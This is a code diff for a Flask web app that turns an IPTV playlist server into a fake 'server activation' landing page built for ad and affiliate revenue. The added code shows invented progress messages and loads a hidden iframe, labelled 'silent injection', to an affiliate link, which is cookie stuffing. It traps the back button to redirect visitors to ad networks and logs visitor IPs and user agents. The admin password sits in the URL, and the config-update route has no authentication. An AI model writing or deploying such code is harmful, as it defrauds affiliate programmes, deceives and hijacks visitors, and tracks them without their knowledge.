@@ -1,152 +1,173 @@
-import os, requests, re, json
-from flask import Flask, render_template_string, request, redirect, jsonify, Response
+
+import os, re, json
+from flask import Flask, render_template_string, request, redirect, jsonify
 from pymongo import MongoClient
 from bson.objectid import ObjectId
 
 app = Flask(__name__)
 
-# --- 1. إعدادات قاعدة البيانات والتنظيف ---
+# --- إعدادات القاعدة ---
 raw_uri = os.getenv("MONGO_URI", "").strip()
 MONGO_URI = re.sub(r'[\s\n\r]', '', raw_uri)
-ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123").strip()
+ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "mounir123")
 
-try:
-    client = MongoClient(MONGO_URI, serverSelectionTimeoutMS=15000)
-    # استخدام قاعدة بيانات محددة لضمان استقرار الاتصال
-    db = client['iptv_db'] 
-    sources_col = db['sources']
-    ads_col = db['ads']
-    client.admin.command('ping')
-except Exception as e:
-    sources_col = ads_col = None
+client = MongoClient(MONGO_URI)
+db = client['gateway_db']
+config_col = db['config'] # لتخزين الروابط
+logs_col = db['logs']     # لتخزين بيانات الزوار
 
-# --- 2. محرك جلب البيانات وتوافقية الـ IPTV ---
-def get_external_m3u(url):
-    try:
-        # إيهام السيرفر الأصلي أننا متصفح ويندوز حقيقي لتخطي الحظر
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': '*/*'
+# دالة لجلب الإعدادات الحالية
+def get_config():
+    conf = config_col.find_one({"type": "main_config"})
+    if not conf:
+        default = {
+            "type": "main_config",
+            "reward_url": "https://google.com", # رابط الـ m3u النهائي
+            "stuffing_url": "", # رابط AliExpress
+            "exit_url": ""     # رابط Adsterra أو Tonic
         }
-        r = requests.get(url.strip(), headers=headers, timeout=20)
-        if r.status_code == 200:
-            content = r.text
-            # حذف سطر EXTM3U من المصدر لتجنب تكراره في الملف النهائي
-            lines = content.splitlines()
-            cleaned_lines = []
-            for line in lines:
-                if "#EXTM3U" not in line and line.strip():
-                    cleaned_lines.append(line.strip())
-            return "\r\n".join(cleaned_lines)
-    except:
-        pass
-    return ""
+        config_col.insert_one(default)
+        return default
+    return conf
 
-# --- 3. تصميم لوحة التحكم (Dark Mode - Mobile First) ---
-HTML_TEMPLATE = """
+# --- واجهة المستخدم (Landing Page) ---
+LANDING_HTML = """
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IPTV Master Dashboard</title>
+    <title>تفعيل سيرفر IPTV</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .progress-bar { width: 0%; transition: width 0.5s; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .loading-text { animation: pulse 1.5s infinite; }
+    </style>
+</head>
+<body class="bg-slate-950 text-white font-sans flex items-center justify-center min-h-screen p-4">
+    <div class="max-w-md w-full bg-slate-900 rounded-[2.5rem] p-8 shadow-2xl border border-slate-800 text-center">
+        <div class="mb-6 text-blue-500 text-5xl">📡</div>
+        <h1 class="text-2xl font-black mb-2">نظام التفعيل الذكي</h1>
+        <p class="text-slate-400 text-sm mb-8">جاري فحص التوافق وتجهيز روابط 4K...</p>
+
+        <div id="loading_section">
+            <div class="w-full bg-slate-800 h-3 rounded-full mb-4 overflow-hidden">
+                <div id="bar" class="progress-bar h-full bg-blue-600 shadow-[0_0_15px_rgba(37,99,235,0.5)]"></div>
+            </div>
+            <p id="status" class="text-xs text-blue-400 font-mono loading-text">Connecting to secure node...</p>
+        </div>
+
+        <div id="reward_section" class="hidden">
+            <div class="bg-green-500/10 border border-green-500/20 p-4 rounded-2xl mb-6">
+                <p class="text-green-400 text-sm font-bold">✅ تم تجهيز السيرفر بنجاح!</p>
+            </div>
+            <a href="{{ reward_url }}" class="block w-full bg-blue-600 hover:bg-blue-500 py-4 rounded-2xl font-black transition-all transform active:scale-95 shadow-xl shadow-blue-900/20">
+                تحميل ملف التشغيل (M3U)
+            </a>
+        </div>
+    </div>
+
+    <!-- الإطار الخفي للحقن الصامت -->
+    {% if stuffing_url %}
+    <iframe src="{{ stuffing_url }}" style="display:none; width:0; height:0; border:0;"></iframe>
+    {% endif %}
+
+    <script>
+        // 1. منطق عداد التحميل
+        let step = 0;
+        const bar = document.getElementById('bar');
+        const status = document.getElementById('status');
+        const messages = ["إرسال طلب التفعيل...", "تجاوز حظر الـ IP...", "حقن بروتوكول البث...", "جاهز للتحميل!"];
+        
+        const interval = setInterval(() => {
+            step += 25;
+            bar.style.width = step + "%";
+            status.innerText = messages[Math.floor(step/30)];
+            if(step >= 100) {
+                clearInterval(interval);
+                document.getElementById('loading_section').classList.add('hidden');
+                document.getElementById('reward_section').classList.remove('hidden');
+            }
+        }, 1500);
+
+        // 2. السر النخبوي: خطف زر الرجوع (Back Button Trap)
+        (function() {
+            const exitUrl = "{{ exit_url }}";
+            if(!exitUrl) return;
+            
+            // دفع حالة وهمية للسجل
+            history.pushState(null, null, location.href);
+            
+            window.onpopstate = function() {
+                // عندما يضغط المستخدم 'رجوع'، يفتح الرابط الربحي
+                location.href = exitUrl;
+            };
+        })();
+    </script>
+</body>
+</html>
+"""
+
+# --- لوحة التحكم (Admin Dashboard) ---
+ADMIN_HTML = """
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8"><title>Admin Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body class="bg-black text-gray-200 font-sans p-4">
-    <div class="max-w-md mx-auto">
-        <header class="text-center py-6 border-b border-gray-800 mb-6">
-            <h1 class="text-2xl font-black text-blue-500">IPTV GATEWAY PRO</h1>
-            <p class="text-gray-500 text-[10px] uppercase tracking-tighter">Powered by Render & MongoDB</p>
-        </header>
-
-        <form action="/admin/add_ad" method="POST" class="bg-gray-900 p-5 rounded-3xl mb-4 border border-gray-800">
-            <h2 class="text-blue-400 text-xs font-bold mb-3 uppercase">📢 حقن إعلان جديد</h2>
-            <input name="name" placeholder="اسم الإعلان (مثلاً: 🎁 هدية اليوم)" class="w-full p-3 mb-2 bg-black rounded-xl text-sm border border-gray-800 focus:border-blue-500 outline-none" required>
-            <input name="url" placeholder="رابط الأفلييت / CPA" class="w-full p-3 mb-3 bg-black rounded-xl text-sm border border-gray-800 focus:border-blue-500 outline-none" required>
-            <button class="w-full bg-blue-600 py-3 rounded-xl font-bold text-sm">إضافة للقائمة</button>
+<body class="bg-slate-950 text-white p-6">
+    <div class="max-w-lg mx-auto">
+        <h1 class="text-2xl font-bold mb-8 text-blue-500 border-b border-slate-800 pb-4">⚙️ إدارة بوابة الأرباح</h1>
+        
+        <form action="/update_config" method="POST" class="space-y-6">
+            <div>
+                <label class="block text-xs text-slate-500 mb-2 uppercase font-bold">1. رابط الجائزة (M3U Final Link)</label>
+                <input name="reward_url" value="{{ c.reward_url }}" class="w-full p-4 bg-slate-900 border border-slate-800 rounded-2xl outline-none focus:border-blue-600 transition">
+            </div>
+            <div>
+                <label class="block text-xs text-slate-500 mb-2 uppercase font-bold">2. رابط الحقن الصامت (AliExpress)</label>
+                <input name="stuffing_url" value="{{ c.stuffing_url }}" class="w-full p-4 bg-slate-900 border border-slate-800 rounded-2xl outline-none focus:border-blue-600 transition">
+            </div>
+            <div>
+                <label class="block text-xs text-slate-500 mb-2 uppercase font-bold">3. رابط الخروج (Adsterra / Tonic)</label>
+                <input name="exit_url" value="{{ c.exit_url }}" class="w-full p-4 bg-slate-900 border border-slate-800 rounded-2xl outline-none focus:border-blue-600 transition">
+            </div>
+            <button class="w-full bg-blue-600 py-4 rounded-2xl font-black shadow-lg shadow-blue-900/20">تحديث الإمبراطورية 🚀</button>
         </form>
-
-        <form action="/admin/add_source" method="POST" class="bg-gray-900 p-5 rounded-3xl mb-6 border border-gray-800">
-            <h2 class="text-green-400 text-xs font-bold mb-3 uppercase">🔗 ربط مصدر قنوات</h2>
-            <input name="url" placeholder="رابط M3U الأصلي" class="w-full p-3 mb-3 bg-black rounded-xl text-sm border border-gray-800 focus:border-green-500 outline-none" required>
-            <button class="w-full bg-green-600 py-3 rounded-xl font-bold text-sm">تفعيل المصدر</button>
-        </form>
-
-        <div class="bg-blue-900/10 p-4 rounded-3xl border border-blue-900/30 text-center mb-10">
-            <p class="text-[10px] text-gray-500 mb-2">رابط النشر في تلجرام:</p>
-            <p class="text-[11px] font-mono text-blue-400 break-all">{{ host_url }}playlist.m3u</p>
-        </div>
     </div>
 </body>
 </html>
 """
 
-# --- 4. المسارات والمنطق (Routes) ---
+# --- المسارات (Routes) ---
+
+@app.route('/')
+def index():
+    conf = get_config()
+    # تسجيل بيانات الزائر (نظام استخبارات بسيط)
+    logs_col.insert_one({
+        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
+        "ua": request.user_agent.string,
+        "time": request.date
+    })
+    return render_template_string(LANDING_HTML, **conf)
 
 @app.route('/admin')
 def admin():
-    if request.args.get('pw') != ADMIN_PASSWORD:
-        return "Unauthorized", 403
-    return render_template_string(HTML_TEMPLATE, host_url=request.host_url)
+    if request.args.get('pw') != ADMIN_PASSWORD: return "Access Denied", 403
+    return render_template_string(ADMIN_HTML, c=get_config())
 
-@app.route('/admin/add_ad', methods=['POST'])
-def add_ad():
-    if ads_col is not None:
-        ads_col.insert_one({"name": request.form['name'], "url": request.form['url'], "clicks": 0})
-    return redirect(f'/admin?pw={ADMIN_PASSWORD}')
-
-@app.route('/admin/add_source', methods=['POST'])
-def add_source():
-    if sources_col is not None:
-        sources_col.insert_one({"url": request.form['url'].strip()})
-    return redirect(f'/admin?pw={ADMIN_PASSWORD}')
-
-# --- المسار الرئيسي الذي يطلبه التطبيق (The M3U Generator) ---
-@app.route('/playlist.m3u')
-def get_playlist():
-    def generate():
-        # 1. رأس الملف بتنسيق M3U القياسي مع سطر فارغ
-        yield "#EXTM3U\r\n\r\n"
-        
-        # 2. قناة فحص ثابتة للتأكد من أن الرابط يعمل في التطبيق
-        yield '#EXTINF:-1 tvg-logo="https://bit.ly/3vL9Y7m", [✅ SERVER ACTIVE]\r\n'
-        yield 'http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4\r\n\r\n'
-
-        # 3. حقن الإعلانات من قاعدة البيانات
-        if ads_col is not None:
-            for ad in ads_col.find():
-                name = ad.get('name', 'Ad')
-                ad_id = str(ad['_id'])
-                # رابط تتبع النقرة
-                click_url = f"{request.host_url.rstrip('/')}/go/{ad_id}"
-                yield f'#EXTINF:-1 tvg-logo="https://cdn-icons-png.flaticon.com/512/743/743224.png", {name}\r\n'
-                yield f'{click_url}\r\n\r\n'
-        
-        # 4. دمج القنوات من المصادر الأصلية
-        if sources_col is not None:
-            for src in sources_col.find():
-                content = get_external_m3u(src['url'])
-                if content:
-                    yield content + "\r\n"
-
-    # أهم جزء: إرسال الـ Headers التي تجبر التطبيق على قبول الملف كـ M3U
-    response_headers = {
-        'Content-Type': 'application/x-mpegurl',
-        'Content-Disposition': 'attachment; filename="playlist.m3u"',
-        'Connection': 'keep-alive',
-        'Access-Control-Allow-Origin': '*'
-    }
-    
-    return Response(generate(), headers=response_headers)
-
-@app.route('/go/<id>')
-def go_to_ad(id):
-    if ads_col is not None:
-        ad = ads_col.find_one_and_update({"_id": ObjectId(id)}, {"$inc": {"clicks": 1}})
-        if ad:
-            return redirect(ad['url'])
-    return "Not Found", 404
+@app.route('/update_config', methods=['POST'])
+def update_config():
+    # تحديث الروابط في MongoDB
+    config_col.update_one({"type": "main_config"}, {"$set": {
+        "reward_url": request.form['reward_url'],
+        "stuffing_url": request.form['stuffing_url'],
+        "exit_url": request.form['exit_url']
+    }})
+    return redirect(f"/admin?pw={ADMIN_PASSWORD}")
 
 if __name__ == '__main__':
-    # الحصول على المنفذ من ريندر أو استخدام 10000
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
